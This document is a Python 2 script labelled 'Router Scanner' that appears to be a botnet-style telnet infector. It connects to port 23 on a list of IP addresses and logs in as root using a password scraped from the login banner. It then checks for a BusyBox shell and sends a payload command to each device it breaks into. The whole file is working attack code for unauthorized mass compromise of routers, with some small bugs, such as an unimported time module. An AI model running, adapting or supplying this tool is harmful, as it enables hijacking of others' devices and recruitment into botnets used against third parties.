#!/usr/bin/python
#Router Scanner 

import threading
import sys, os, re, socket
from time import sleep
from Queue import *
from sys import stdout

if len(sys.argv) < 3:
	print "Usage: python "+sys.argv[0]+" <list> <threads>"
	sys.exit()

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
queue = Queue()
queue_count = 0
cmd = ""

class russian(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		try:
			tn = socket.socket()
			tn.settimeout(8)
			tn.connect((self.ip,23))
			sleep(0.2)
			check = tn.recv(2048)
			checks = re.findall(r'\:\w+', check)
			check2 = "".join(checks)
			username = "root"
			password = check2.replace(":", "")
		except Exception:
			tn.close()
		try:
			if "ogin" in check:
				tn.send(username + "\n")
				sleep(0.09)
			elif "assword" in check:
				tn.send(password + "\n")
				sleep(0.09)
		except Exception:
			tn.close()
		try:
			hoho = ''
			hoho += readUntil(tn, "assword:")
			if "assword" in hoho:
				tn.send(password + "\n")
				sleep(0.8)
			else:
				pass
		except Exception:
			tn.close()
		try:
			prompt = ''
			prompt += tn.recv(40960)
			if "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt:
				try:
					success = False
					timeout = 8
					data = ["BusyBox", "Built-in"]
					tn.send("enable" + "\n")
					sleep(0.01)
					tn.send("sh" + "\n")
					sleep(0.01)
					tn.send("shell" + "\n")
					sleep(0.01)
					tn.send("help" + "\n")
					sleep(0.01)
					tn.send("busybox" + "\r\n")
					buf = '' # NO FALSE POSSITIVES OVA HERE
					start_time = time.time()
					while time.time() - start_time < timeout:
						buf += tn.recv(40960)
						sleep(0.01)
						for info in data:
							if info in buf and "unrecognized" not in buf:
								success = True
				except:
					pass
			else:
				tn.close()
			if success == True:
				try:
					tn.send(cmd + "\r\n")
					print "Command Sent!"
					sleep(15)
					tn.close()
				except:
					tn.close()
			tn.close()
		except Exception:
			tn.close()

def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(1024)
		sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')

def worker():
	try:
		while True:
			try:
				ip = queue.get()
				thread = russian(ip)
				thread.start()
				queue.task_done()
				sleep(0.2)
			except:
				pass
	except:
		pass

for ip in ips:
	queue_count += 1
	stdout.write("\r[%d] Added to queue" % queue_count)
	stdout.flush()
	queue.put(ip)
print "\n"

for l in xrange(threads):
	try:
		t = threading.Thread(target=worker)
		t.start()
		sleep(0.01)
	except:
		pass